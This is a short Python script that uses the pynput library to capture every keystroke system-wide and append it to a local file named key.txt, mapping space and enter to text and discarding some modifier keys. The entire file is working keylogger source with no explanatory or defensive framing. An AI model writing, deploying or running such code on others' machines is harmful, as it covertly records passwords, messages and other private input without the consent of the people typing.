from pynput.keyboard import Listener, Key

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == "Key.ctrl_l":
        letter = ""
    elif letter == "Key.enter":
        letter = "\n"
    elif letter == "Key.backspace":
        letter = ""   

    with open("key.txt", 'a') as f:
        f.write(letter)
        
with Listener(on_press=write_to_file) as l:
    l.join()


